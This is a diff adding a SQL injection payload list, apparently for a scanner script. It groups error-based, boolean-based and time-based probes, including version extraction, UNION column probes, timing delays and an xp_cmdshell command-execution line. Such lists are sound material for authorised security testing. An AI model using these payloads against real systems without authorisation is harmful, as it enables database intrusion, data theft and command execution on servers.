@@ -1,0 +1,58 @@
+# ============================================================
+# SQL Injection Payloads
+# Used by scanner.py — one payload per line, comments ignored
+# ============================================================
+
+# --- Error-based payloads ---
+'
+''
+"
+""
+`
+' OR '1'='1
+" OR "1"="1
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1'/*
+') OR ('1'='1
+')) OR (('1'='1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+1' ORDER BY 1--
+1' ORDER BY 10--
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+'; EXEC xp_cmdshell('whoami')--
+
+# --- Boolean-based payloads ---
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+' OR 1=1--
+' OR 1=2--
+1 AND 1=1
+1 AND 1=2
+1 OR 1=1
+1 OR 1=2
+' AND SUBSTRING(@@version,1,1)='5'--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+') AND 1=1--
+') AND 1=2--
+
+# --- Time-based payloads ---
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND BENCHMARK(5000000,MD5('test'))--
+1; WAITFOR DELAY '0:0:5'--
+' AND (SELECT * FROM (SELECT SLEEP(5))a)--
+') OR SLEEP(5)--
+' UNION SELECT SLEEP(5)--
+'; SELECT pg_sleep(5)--
+' AND 1=(SELECT 1 FROM pg_sleep(5))--
+' || pg_sleep(5)--
+1' AND SLEEP(5)#
